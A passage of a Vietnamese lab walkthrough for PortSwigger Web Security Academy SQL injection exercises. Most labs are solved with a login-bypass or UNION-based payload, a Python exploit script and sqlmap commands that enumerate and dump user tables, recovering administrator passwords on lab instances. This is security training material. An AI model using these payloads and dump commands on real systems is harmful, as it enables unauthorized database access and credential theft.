urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0abd00e50373f1a0855940ec00e4000c.web-security-academy.net'

session = requests.Session()

response = session.get(
    url + "/login",
    verify=False,
)
soup = BeautifulSoup(response.text,'html.parser')
csrf = soup.find('input',{'name' : 'csrf'})['value']

payload = "administrator' or '1'='1' --"
data = {
    'csrf' : csrf,
    'username' : payload,
    'password' : 'cuong',
}
response = session.post(
    url + "/login",
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/Sk3T5Ejqp.png)

mục đích của chúng ta đã hoàn thành và mình cũng đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/H1jEnEjqp.png)

### SQLMAP

- mình đã làm lại bài này theo sqlmap

mình vào burp suite và chuột phải nhấn copy to file và dùng sqlmap để quét file này

![ảnh](https://hackmd.io/_uploads/BJfFLfX26.png)

mình quét file này với lệnh

```sql!
sqlmap -r sqlmap.txt --batch --threads=5 --level=5 --risk=3
```

hoặc mình có thể chuyển đổi sang method get và chạy trực tiếp

![ảnh](https://hackmd.io/_uploads/HkxVP5ShT.png)

```!
sqlmap -u "https://0a89002b043d719f826fabab00ff00b7.web-security-academy.net/login?csrf=X4iKC4ZlXkrkGlAJRHJSkWEHMknLb115&username=administrator&password=peteer" --batch
```

## 3. Lab: SQL injection UNION attack, determining the number of columns returned by the query

link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns

### Đề bài

![image](https://hackmd.io/_uploads/Bkqhfcj56.png)

### Phân tích

- Trang web chứa lỗ hổng SQL injection trong chức năng bộ lọc hiển thị sản phẩm. Chúng ta có thể xác định số cột dữ liệu được trả về trong câu truy vấn. Để giải quyết bài lab, chúng ta cần sử dụng query UNION xác định số cột dữ liệu trả về bằng cách gộp các cột dữ liệu này với null.
- Tương tự bài lab 1, tham số category chính là nơi để khai thác SQLi.

mình gửi single quote và nhận phản hồi lỗi 500 từ phía server cho thấy web này có thể dính lỗi sqli

![image](https://hackmd.io/_uploads/Hkyfuco96.png)

và chúng ta cần xác định số cột trong table này bằng UNION

### Khai thác

- Câu truy vấn trả về 1 cột: `/filter?category=Lifestyle' UNION SELECT NULL--` và bị lỗi 500

  - ![image](https://hackmd.io/_uploads/S1I3d9sca.png)

- Câu truy vấn trả về 2 cột: `/filter?category=Lifestyle' UNION SELECT NULL, NULL--` và bị lỗi 500

  - ![image](https://hackmd.io/_uploads/HJBMK9scT.png)

- Câu truy vấn trả về 3 cột: `/filter?category=Lifestyle' UNION SELECT NULL, NULL, NULL--` và đã thực hiện thành công. Vậy bài này bảng này có 3 cột

![image](https://hackmd.io/_uploads/S1Qmqcs9a.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a73007d03167f53808cf43c00880023.web-security-academy.net'

session = requests.Session()

payload = "Lifestyle' UNION SELECT NULL, NULL, NULL--"
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

mục đích của chúng ta đã hoàng thành và mình cũng đã giải được bài lab này

![image](https://hackmd.io/_uploads/S1Dv9ci9T.png)

### SQLMAP

- mình đã làm lại bài này với sqlmap

đầu liên mình dùng lệnh sau để quét

```sql!
sqlmap -u https://0a1000b60490bae5807117cd00b700f6.web-security-academy.net/filter?category=Lifestyle  --batch
```

và mình được

![ảnh](https://hackmd.io/_uploads/rydBtGm26.png)

và được database dùng PostgreSQL và có thể khai thác với kiểu tấn công UNION với 3 cột

dùng payload mà sql cho mình in được dòng chữ **qkqpqsJoqpnIRhMdUOashnnrPzQcseUKTwYmOlUHQLRvMqxqvq** ra màn mình

```sql!
https://0a1000b60490bae5807117cd00b700f6.web-security-academy.net/filter?category=Lifestyle%27%20UNION%20ALL%20SELECT%20NULL,(CHR(113)%7C%7CCHR(107)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(113))%7C%7C(CHR(115)%7C%7CCHR(74)%7C%7CCHR(111)%7C%7CCHR(113)%7C%7CCHR(112)%7C%7CCHR(110)%7C%7CCHR(73)%7C%7CCHR(82)%7C%7CCHR(104)%7C%7CCHR(77)%7C%7CCHR(100)%7C%7CCHR(85)%7C%7CCHR(79)%7C%7CCHR(97)%7C%7CCHR(115)%7C%7CCHR(104)%7C%7CCHR(110)%7C%7CCHR(110)%7C%7CCHR(114)%7C%7CCHR(80)%7C%7CCHR(122)%7C%7CCHR(81)%7C%7CCHR(99)%7C%7CCHR(115)%7C%7CCHR(101)%7C%7CCHR(85)%7C%7CCHR(75)%7C%7CCHR(84)%7C%7CCHR(119)%7C%7CCHR(89)%7C%7CCHR(109)%7C%7CCHR(79)%7C%7CCHR(108)%7C%7CCHR(85)%7C%7CCHR(72)%7C%7CCHR(81)%7C%7CCHR(76)%7C%7CCHR(82)%7C%7CCHR(118)%7C%7CCHR(77))%7C%7C(CHR(113)%7C%7CCHR(120)%7C%7CCHR(113)%7C%7CCHR(118)%7C%7CCHR(113)),NULL--
```

![ảnh](https://hackmd.io/_uploads/SJK6iGm2a.png)

![ảnh](https://hackmd.io/_uploads/B1DwszmnT.png)

nhưng lab để solve lab cần dùng lệnh UNION sau

```sql!
' UNION SELECT NULL, NULL, NULL -- -
```

![ảnh](https://hackmd.io/_uploads/HJpmTzX2p.png)

## 4. Lab: SQL injection UNION attack, finding a column containing text

link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text

### Đề bài

![image](https://hackmd.io/_uploads/BJqCGvnca.png)

### Phân tích

- Lab này có chứa lỗ hổng SQL Injection ở cơ chế lọc category. Giờ mình cần phải thực hiện tấn công kiểu UNION để tìm được cột nào đang ở dạng string
- Chúng ta có thể sử dụng chức năng bộ lọc hiển thị sản phẩm theo loại, được xác định qua tham số category trong thanh URL truyền tới hệ thống qua phương thức GET. Tham số này có thể thay đổi tùy ý. Giá trị này cũng được hiển thị trong giao diện response.
- mình gửi single quote và nhận phản hồi lỗi 500 từ phía server cho thấy web này có thể dính lỗi sqli

![image](https://hackmd.io/_uploads/Hkyfuco96.png)

- Chúng ta cần giao diện response hiển thi chuỗi **'cvdKvm'**. Kiểm tra lỗ hổng SQL injection tại tham số category:

![image](https://hackmd.io/_uploads/SJ5Axun56.png)

### Khai thác

- như bài trước mình cần xác định số cộttrước của table và với payload: `/filter?category=' UNION SELECT NULL, NULL, NULL--` không trả về error.

![image](https://hackmd.io/_uploads/SJNhNDh5T.png)

sau khi được số cột cuat table là 3 mình cần xác định cột nào có kiểu string để chèn chuỗi ` 'sXPvlw'` vào

- Kiểm tra kiểu dữ liệu trả về trong cột 1. Payload: `/filter?category=' UNION SELECT 'colume1', NULL, NULL--` trả về error:

![image](https://hackmd.io/_uploads/H1KEOv2ca.png)

- Kiểm tra kiểu dữ liệu trả về trong cột 1. Payload: `/filter?category=' UNION SELECT NULL, 'colume2', NULL--` trả về chuỗi column2 trong giao diện:

![image](https://hackmd.io/_uploads/SkiPdDh5p.png)

![image](https://hackmd.io/_uploads/HkDmKDhcp.png)

Như vậy dữ liệu trong cột 2 tương thích với kiểu dữ liệu string. Hiển thị chuỗi pYazDc trong giao diện. Payload: `/filter?category=' UNION SELECT NULL, 'cvdKvm', NULL--`

![image](https://hackmd.io/_uploads/ByrTXOhqT.png)

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a4c007504a579df838bcdac004c0033.web-security-academy.net'

session = requests.Session()
response = session.get(
    url,
    verify=False,
)
pattern = r"Make the database retrieve the string: '\w{6}'"
match = re.search(pattern, response.text)
data_string = match.group()
data_string = data_string.split(': ')[1]
print(data_string)

# xác định số cột
for x in range(20):
    test_column = "' UNION SELECT " + "NULL," * x + "NULL--"
    params = {'category' : test_column,}
    response = session.get(url + "/filter",params=params,verify=False,)
    if(response.status_code == 200):
        print("bảng có số cột là: ", (x+1))
        break

payload = "' UNION SELECT NULL, " + data_string + ", NULL--"
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/H1d_7OhcT.png)

mục đích của chúng ta đã hoàn thành và mình đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/HykgNOhcp.png)

### SQLMAP

- mình đã làm lại bài này với sqlmap
- đầu tiên mình dùng lệnh sau để quét

```sql!
sqlmap -u https://0afb0092044d2e6780392b68009700af.web-security-academy.net/filter?category=Gifts  --batch
```

![ảnh](https://hackmd.io/_uploads/SyNXAfmh6.png)

và được database dùng PostgreSQL và có thể khai thác với kiểu tấn công UNION với 3 cột và sqlmap tìm được cột thứ 2 có kiểu string

![ảnh](https://hackmd.io/_uploads/ry_sRMQhT.png)

dùng payload mà sql cho mình in được dòng chữ **qqbjqgubDxLTuBPARNqUilGmsRvZIHalWZdTDcNlNmUUXqzzzq** ra màn mình

```sql!
https://0afb0092044d2e6780392b68009700af.web-security-academy.net/filter?category=Gifts%27%20UNION%20ALL%20SELECT%20NULL,(CHR(113)||CHR(113)||CHR(98)||CHR(106)||CHR(113))||(CHR(103)||CHR(117)||CHR(98)||CHR(68)||CHR(120)||CHR(76)||CHR(84)||CHR(117)||CHR(66)||CHR(80)||CHR(65)||CHR(82)||CHR(78)||CHR(113)||CHR(85)||CHR(105)||CHR(108)||CHR(71)||CHR(109)||CHR(115)||CHR(82)||CHR(118)||CHR(90)||CHR(73)||CHR(72)||CHR(97)||CHR(108)||CHR(87)||CHR(90)||CHR(100)||CHR(84)||CHR(68)||CHR(99)||CHR(78)||CHR(108)||CHR(78)||CHR(109)||CHR(85)||CHR(85)||CHR(88))||(CHR(113)||CHR(122)||CHR(122)||CHR(122)||CHR(113)),NULL--
```

![ảnh](https://hackmd.io/_uploads/SJ6l1X73a.png)

![ảnh](https://hackmd.io/_uploads/S15WkQmh6.png)

và mình chèn chuỗi đề bài cho vào cột thứ 2 và solve được lab

## 5. Lab: SQL injection attack, querying the database type and version on Oracle

link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle

### Đề bài

![image](https://hackmd.io/_uploads/SyqJ6Ni56.png)

### Phân tích

- Trước khi đi vào khai thác dữ liệu, chúng ta nên thu thập các thông tin liên quan tới mục tiêu, càng nắm bắt được nhiều thông tin, khả năng tấn công thành công sẽ càng cao. Một trong những thông tin cần xác nhận đầu tiên chính là kiểu và phiên bản hệ cơ sở dữ liệu. Tất nhiên rồi, mỗi hệ cơ sở dữ liệu có các cú pháp truy vấn khác nhau, đây là một thông tin rất quan trọng giúp cho bước xây dựng payload sau đó.

![image](https://hackmd.io/_uploads/HJdSeSsqp.png)

- Trang web chứa lỗ hổng SQL injection trong chức năng bộ lọc hiển thị sản phẩm. Kết quả được hiển thị trong giao diện trả về. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm hiển thị phiên bản hiện tại hệ quản trị cơ sở dữ liệu Oracle trong giao diện trang web.

mình gửi single quote và nhận phản hồi lỗi 500 từ phía server cho thấy web này có thể dính lỗi sqli

![image](https://hackmd.io/_uploads/SJfeZSjq6.png)

### Khai thác

- mình phát hiện ra khi sử dụng câu lệnh SELECT thì phải xác định nó lấy từ bảng hợp lệ nào với `FROM`. Trong Oracle, tồn tại một bảng mặc định ==dual==. Ta có thể sử dụng nó để thực hiện SELECT.

- Trong SQL, câu lệnh ORDER BY được sử dụng để sắp xếp kết quả của một truy vấn theo một hoặc nhiều cột. Khi bạn sử dụng ORDER BY với một số nguyên như "2", nó thường là để chỉ định cột thứ hai trong danh sách SELECT làm cột sắp xếp.

VD: kết quả của truy vấn sẽ được sắp xếp dựa trên giá trị của cột thứ hai trong danh sách SELECT, tức là column2.

```sql
SELECT column1, column2, column3
FROM your_table
ORDER BY 2;
```

Kiểm tra số cột dữ liệu trả về trong câu lệnh truy vấn, payload:

```sql
' UNION SELECT NULL,NULL FROM dual --
```

và

```sql
' ORDER BY 2 --
```

không xuất hiện error
![image](https://hackmd.io/_uploads/B10gMHi5T.png)

![image](https://hackmd.io/_uploads/ryaJQrsqp.png)

và payload xuất hiện error:

```sql
' UNION SELECT NULL,NULL,NULL FROM dual --
```

và

```sql
' ORDER BY 3 --
```

![image](https://hackmd.io/_uploads/BJ51Mri56.png)

![image](https://hackmd.io/_uploads/B1j87Hiqa.png)

- Query trả về cho ta 2 cột, sau đó mình phải tìm xem cột nào trả về giá trị là chuỗi, thì em sẽ đưa chuỗi vào lần lượt từng cột, tìm kiếm cột dữ liệu tương thích với kiểu chuỗi, payload: `/filter?category=' UNION SELECT 'column1', 'column2' FROM dual--`

![image](https://hackmd.io/_uploads/HJCxNBo9p.png)

Cả 2 cột dữ liệu đều có thể tận dụng để hiển thị thông tin khai thác. Thực hiện truy xuất phiên bản cơ sở dữ liệu hiện tại, payload: `/filter?category=' UNION SELECT banner, 'column2' FROM v$version--`, bài lab hoàn thành:

![image](https://hackmd.io/_uploads/S1tfLrjqT.png)

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0aad00ae038c062e8218a616000a00f5.web-security-academy.net'

session = requests.Session()

payload = "' UNION SELECT banner, 'column2' FROM v$version--"
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/rJjvSBic6.png)

mục đích của chúng ta đã hoàn thành và mình đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/S10hrrsqa.png)

### SQLMAP

- mình đã làm lại bài này với sqlmap
- đầu tiên mình dùng lệnh sau để quét

```sql!
sqlmap -u https://0ad9004c04ceb2d683ea28c100320045.web-security-academy.net/filter?category=Lifestyle --batch
```

và mình được

![ảnh](https://hackmd.io/_uploads/SkEvf7Qha.png)

vậy ở đây lab dùng hệ quản trị CSDL Oracle và chúng ta có thể tấn công UNION với 2 cột

tiếp tục dùng lệnh sau để xem thông tin phiên bản của CSDL này

```sql!
sqlmap -u https://0ad9004c04ceb2d683ea28c100320045.web-security-academy.net/filter?category=Lifestyle --batch --fingerprint -banner
```

![ảnh](https://hackmd.io/_uploads/ryfRmQm3p.png)

vậy mình được version CSDL được lab này dùng là **11.2.0.2.0**

## 6. Lab: SQL injection attack, querying the database type and version on MySQL and Microsoft

link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft

### Đề bài

![image](https://hackmd.io/_uploads/rkdPr_3q6.png)

### Phân tích

- Trang web chứa lỗ hổng SQL injection trong chức năng bộ lọc hiển thị sản phẩm. Kết quả được hiển thị trong giao diện trả về. Để giải quyết bài lab, chúng ta cần khai thác lỗ hổng nhằm truy xuất phiên bản hiện tại hệ quản trị cơ sở dữ liệu trong giao diện trang web, biết rằng hệ thống sử dụng MySQL hoặc Microsoft.
- mình gửi single quote và nhận phản hồi lỗi 500 từ phía server cho thấy web này có thể dính lỗi sqli

![image](https://hackmd.io/_uploads/SyH68d25p.png)

### Khai thác

- như bài trước mình cần xác định số cột trước của table và với payload: `/filter?category=' UNION SELECT NULL, NULL-- ` không trả về error.

![image](https://hackmd.io/_uploads/SJpdwu39a.png)

Như vậy câu lệnh truy vấn trả về 2 cột dữ liệu. Tiếp theo tìm kiếm cột dữ liệu tương thích với kiểu chuỗi, payload: `/filter?category=' UNION SELECT 'column1', 'column2'-- `

![image](https://hackmd.io/_uploads/r1cJOOhca.png)

Cả hai cột dữ liệu đều có thể tận dụng để hiển thị thông tin khai thác.

![image](https://hackmd.io/_uploads/S1pQ__hqT.png)

Cuối cùng, truy xuất thông tin phiên bản hiện tại của hệ quản trị cơ sở dữ liệu MySQL, payload: `/filter?category=' UNION SELECT @@version, NULL-- `, bài lab hoàn thành:

![image](https://hackmd.io/_uploads/S1qTtO29T.png)

mình đã viết lại script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a6c0034043a22ba81fcd42a007f00a6.web-security-academy.net'

session = requests.Session()

# xác định số cột
for x in range(20):
    test_column = "' UNION SELECT " + "NULL," * x + "NULL-- "
    params = {'category' : test_column,}
    response = session.get(url + "/filter",params=params,verify=False,)
    if(response.status_code == 200):
        print("bảng có số cột là: ", (x+1))
        break

payload = "' UNION SELECT @@version, NULL-- "
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/H1xTtF_2qT.png)

![image](https://hackmd.io/_uploads/SJf9tdhc6.png)

mục đích của chúng ta đã hoàn thành và mình đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/HyGHt_n9a.png)

### SQLMAP

- mình đã làm lại bài này với sqlmap
- tương tự bài trên mình dùng lệnh sau để xem version của database

```sql!
 sqlmap -u https://0a9100d80392921f84f9077c007f003f.web-security-academy.net/filter?category=Lifestyle  --batch --fingerprint -banner
```

và được

![ảnh](https://hackmd.io/_uploads/rkHQ87XnT.png)

vậy có được version **8.0.36-0ubuntu0.20.04.1**

![ảnh](https://hackmd.io/_uploads/rJ6VLm7ha.png)

## 7. Lab: SQL injection UNION attack, retrieving data from other tables

link: https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables

### Đề bài

![image](https://hackmd.io/_uploads/BJOaqd39a.png)

### Phân tích

- Lab này chứa một lỗ hổng SQL Injection ở cơ chế lọc category, ta cần tấn công bằng UNION để lấy dữ liệu từ các bảng khác, trong cơ sở dữ liệu của một bảng user có 2 cột là username và password
- Để solve được lab, mình cần phải lấy được hết tài khoản và mật khẩu, rồi dùng thông tin đó để đăng nhập với người dùng admin
- mình gửi single quote và nhận phản hồi lỗi 500 từ phía server cho thấy web này có thể dính lỗi sqli

![image](https://hackmd.io/_uploads/SyH68d25p.png)

### Khai thác

- mình kiểm tra số cột của bảng với Payload: `/filter?category=' UNION SELECT NULL, NULL--`
- ![image](https://hackmd.io/_uploads/SJx02un5T.png)

Như vậy câu lệnh truy vấn trả về 2 cột dữ liệu. Tiếp theo tìm kiếm cột dữ liệu tương thích với kiểu string. Payload `/filter?category=' UNION SELECT 'column1', 'column2'--`

![image](https://hackmd.io/_uploads/SkkQadn5a.png)

- Cả 2 cột đều có thể tận dụng để hiển thị thông tin khai thác. Do chúng ta đã biết tên bảng cần khai thác là users cũng với hai cột có tên là username và password, thông tin người dùng cần khai thác có username là administrator, nên ta có thể xây dựng payload như sau:`/filter?category=' UNION SELECT password, NULL FROM users WHERE username = 'administrator'--`

![image](https://hackmd.io/_uploads/SJHkJKhqa.png)

và mình nhận được mật khẩu là **wnat2rywwgtzwcyzeoyo**

Đăng nhập với tài khoản **administrator:wnat2rywwgtzwcyzeoyo**, bài lab hoàn thành:

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a3400b30314a17886c5a3f4002a0032.web-security-academy.net'

session = requests.Session()

# xác định số cột
for x in range(20):
    test_column = "' UNION SELECT " + "NULL," * x + "NULL-- "
    params = {'category' : test_column,}
    response = session.get(url + "/filter",params=params,verify=False,)
    if(response.status_code == 200):
        print("bảng có số cột là: ", (x+1))
        break

payload = "' UNION SELECT password, NULL FROM users WHERE username = 'administrator'--"
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)
pattern = r"\b\w{20}\b"
match = re.search(pattern, response.text)
password = match.group()

response = session.get(
    url + "/login",
    verify=False,
)
soup = BeautifulSoup(response.text,'html.parser')
csrf= soup.find('input', {'name': 'csrf'})['value']
data= {
    'username' : 'administrator',
    'password' : password,
    'csrf' : csrf,
}
response = session.post(
    url + "/login",
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/HkqnlYhqa.png)

mục đích của chúng ta đã hoàn thành và mình đã giải quyết được lab này

![image](https://hackmd.io/_uploads/BydJZK296.png)

### SQLMAP

- mình đã làm lại bài này với sqlmap
- đầu tiên mình chạy tấn công mặc định và tìm tên database có trong cơ sở dữ liệu bằng lệnh

```sql!
sqlmap -u https://0aab000904533546845efe8600ce00bb.web-security-academy.net/filter?category=Lifestyle  --batch --dbs
```

và mình được database tên **public**

![ảnh](https://hackmd.io/_uploads/BJR__5Sha.png)

cùng với đó biết được lab dùng CSDL PostgreSQL và có thể tấn công bằng UNION query

![ảnh](https://hackmd.io/_uploads/H1LmFcH36.png)

- mình tiếp tục liệt kê các bảng trong database này bằng lệnh

```sql!
sqlmap -u https://0aab000904533546845efe8600ce00bb.web-security-academy.net/filter?category=Lifestyle  --batch -D public --tables
```

và mình được 2 bảng

![ảnh](https://hackmd.io/_uploads/HJZzY5Hn6.png)

mục đích của bài là lấy được password của administrator nên mình vào table **users** và xem cấu trúc của bange này bằng lệnh

```sql!
sqlmap -u https://0aab000904533546845efe8600ce00bb.web-security-academy.net/filter?category=Lifestyle  --batch -D public -T users --columns
```

![ảnh](https://hackmd.io/_uploads/SJzfqcS3T.png)

trong table users có lưu email, password và username và mình sẽ dump nó để đọc thông tin của bảng này với lệnh

```sql!
sqlmap -u https://0aab000904533546845efe8600ce00bb.web-security-academy.net/filter?category=Lifestyle  --batch -D public -T users --dump
```

và mình được mật khẩu của admin là **n2rms4i02ubss50z23y7**

![ảnh](https://hackmd.io/_uploads/HkXs95Hna.png)

đem đi đăng nhập và mình solve được lab này

![ảnh](https://hackmd.io/_uploads/S1jJsqSha.png)

## 8. Lab: SQL injection attack, listing the database contents on non-Oracle databases

link: https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle

### Đề bài

![image](https://hackmd.io/_uploads/HJsOXhnqa.png)

### Phân tích

- Lab này có chứa lỗ hổng SQL Injection ở cơ chế phân loại sản phẩm, nhiệm vụ của mình là cần tìm được bảng có chứa tên tài khoản và mật khẩu, từ đó lấy được thông tin của admin. Đây là một bài trên hệ quản trị không phải Oracle.
- mình gửi single quote và nhận phản hồi lỗi 500 từ phía server cho thấy web này có thể dính lỗi sqli

![image](https://hackmd.io/_uploads/rJN_En39p.png)

### Khai thác

- Kiểm tra số cột dữ liệu trả về trong câu lệnh truy vấn, payload: `/filter?category=' ORDER BY 2--` không trả về error

![image](https://hackmd.io/_uploads/BkSTN2hq6.png)

`/filter?category=' ORDER BY 3--` trả về error:

![image](https://hackmd.io/_uploads/HkOgH32cp.png)

Như vậy câu lệnh truy vấn trả về 2 cột dữ liệu. Tìm kiểm cột dữ liệu tương thích với kiểu chuỗi, payload: `/filter?category=' UNION SELECT 'column1', 'column2'--`

![image](https://hackmd.io/_uploads/SyF4Bh2qa.png)

Như vậy cả hai cột đều có thể tận dụng để hiển thị thông tin khai thác.

Kiểm tra version thì đây là PostgreSQL.

![image](https://hackmd.io/_uploads/ry9x_2n5a.png)

- Mình biết được đây không phải Oracle, nên luôn tồn tại 1 bảng information_schema chứa tên các bảng, loại các bảng, nên mình tiến hành tìm tên tables trong information_schema.tables Truy xuất tên các bảng, payload: `/filter?category=' UNION SELECT table_name, NULL FROM information_schema.tables--`

![image](https://hackmd.io/_uploads/ByGjS3396.png)

Như chúng ta có thể thấy, có rất nhiều bảng tên user, có một số bảng khá đáng ngờ trong trang web này như:

- user_defined_types
- pg_statio_user_sequences
- pg_user_mappings
- pg_stat_xact_user_functions
- user_mappings
- pg_stat_user_tables
- user_mapping_options
- pg_stat_xact_user_tables
- pg_statio_user_tables
- users_tkewxf
- pg_stat_user_indexes
- pg_statio_user_indexes
- pg_user
- pg_stat_user_functions

Quan sát nhận thấy table **pg_user** có thể chứa thông tin tài khoản người dùng:

![image](https://hackmd.io/_uploads/r1gFL2ncT.png)

Truy xuất tên các cột trong bảng pg_user, payload: `/filter?category=' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'pg_user'--`

![image](https://hackmd.io/_uploads/BkAe5hh56.png)

Trong bảng pg_user có chứa cột usename và passwd là cột chúng ta đang tìm kiếm. Truy xuất thông tin hai cột này, payload: `/filter?category=' UNION SELECT usename || ':' || passwd, NULL FROM pg_user--` mình sẽ hiển thị dưới dạng nối chuỗi `username:password`

![image](https://hackmd.io/_uploads/Skbo932cT.png)

thật không may chúng ta vẫn chưa tìm được tài khoản của admin

chú ý vào một table khác có tên **users_tkewxf**

- Thực hiện lại các bước trên, truy xuất thông tin tên cột, payload: `/filter?category=' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = 'users_tkewxf'--`

![image](https://hackmd.io/_uploads/By423hn5p.png)

Truy xuất thông tin tài khoản administrator, payload: `/filter?category=' UNION SELECT username_fjawon || ':' || password_frnaej, NULL FROM users_tkewxf--`

![image](https://hackmd.io/_uploads/BkWPRn3cp.png)

mình đăng nhập với tài khoản admin **administrator:yjcdg5hhww459lc3hwbc** và giải quyết được bài lab này

![image](https://hackmd.io/_uploads/SyL4Q6n56.png)

mình đã viết script khai thác

```python
#!/usr/bin/python3.7
import requests
import re
from bs4 import BeautifulSoup
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from urllib.parse import quote

url = 'https://0a3500cb03a56ef880e4e9a6003700d6.web-security-academy.net'

session = requests.Session()

# xác định số cột
for x in range(20):
    test_column = "' UNION SELECT " + "NULL," * x + "NULL-- "
    params = {'category' : test_column,}
    response = session.get(url + "/filter",params=params,verify=False,)
    if(response.status_code == 200):
        print("bảng có số cột là: ", (x+1))
        break

payload = "' UNION SELECT table_name, NULL FROM information_schema.tables--"
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)
pattern = r"users_\w{6}\b"
match = re.search(pattern, response.text)
table_user = match.group()
print(table_user)

payload = "' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name = '" + table_user + "'--"
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)
pattern = r"username_\w{6}\b"
match = re.search(pattern, response.text)
username_column = match.group()
print(username_column)
pattern = r"password_\w{6}\b"
match = re.search(pattern, response.text)
passwod_column = match.group()
print(passwod_column)

payload = "' UNION SELECT " + username_column + " || ':' || " + passwod_column + ", NULL FROM " + table_user + "--"
params = {
   'category' : payload,
}
response = session.get(
    url + "/filter",
    params=params,
    verify=False,
)

pattern = r"administrator:\w{20}\b"
match = re.search(pattern, response.text)
account = match.group()
username = account.split(':')[0]
password = account.split(':')[1]

response = session.get(
    url + "/login",
    verify=False,
)
soup = BeautifulSoup(response.text,'html.parser')
csrf= soup.find('input', {'name': 'csrf'})['value']
data= {
    'username' : username,
    'password' : password,
    'csrf' : csrf,
}
response = session.post(
    url + "/login",
    data=data,
    verify=False,
)

soup = BeautifulSoup(response.text,'html.parser')
print(soup)
```

![image](https://hackmd.io/_uploads/ByShMTn56.png)

![image](https://hackmd.io/_uploads/SyCnfanq6.png)

mục đích của chúng ta đã hoàn thành và mình đã giải quyết được bài lab này

![image](https://hackmd.io/_uploads/SkCTz6n56.png)

### SQLMAP

- mình đã làm lại bài này với sqlmap
- đầu tiên mình chạy tấn công mặc định và tìm tên database có trong cơ sở dữ liệu bằng lệnh

```sql!
sqlmap -u https://0aab000904533546845efe8600ce00bb.web-security-academy.net/filter?category=Lifestyle  --batch --dbs
```

- mình được 3 database **public**, **pg_catalog**
  và **information_schema**

![ảnh](https://hackmd.io/_uploads/ByQMh9B2T.png)

cùng với đó biết được lab dùng CSDL PostgreSQL và có thể tấn công bằng UNION query

![ảnh](https://hackmd.io/_uploads/r1WZn5Hhp.png)

- mình thấy những bài trước username và password được lưu ơr database public nên mình vào database này và xem các bảng bằng lệnh

```sql!
sqlmap -u https://0a46002c040595ed808f8a72003400c3.web-security-academy.net/filter?category=Accessories  --batch -D public --tables
```

![ảnh](https://hackmd.io/_uploads/S1arpcBnp.png)

- mình được 2 bảng trong đó có **users_ztmdbv**
- mình vào bảng này và thử xem các cột có trường password không bằng lệnh

```sql!
sqlmap -u https://0a46002c040595ed808f8a72003400c3.web-security-academy.net/filter?category=Accessories  --batch -D public -T users_ztmdbv --columns
```

và mình thấy có cột **password_xrknpd**

![ảnh](https://hackmd.io/_uploads/rJ2g05ShT.png)

tiếp theo mình dump bảng này ra và đọc thông tin bằng lệnh

```sql!
sqlmap -u https://0a46002c040595ed808f8a72003400c3.web-security-academy.net/filter?category=Accessories  --batch -D public -T users_ztmdbv --dump
```

![ảnh](https://hackmd.io/_uploads/H1oSCqr2T.png)

mình được password của admin là **2y5kk21figif1nh15wdq**

- đem đi đăng nhập và mình solve được lab này

![ảnh](https://hackmd.io/_uploads/SyOsAcrha.png)

mình xem các bảng trong 2 database còn lại còn lại

```sql!
sqlmap -u https://0a46002c040595ed808f8a72003400c3.web-security-academy.net/filter?category=Accessories  --batch -D pg_catalog --tables
```

![ảnh](https://hackmd.io/_uploads/B1KnJjr3T.png)

```sql!
sqlmap -u https://0a46002c040595ed808f8a72003400c3.web-security-academy.net/filter?category=Accessories  --batch -D information_schema --tables
```

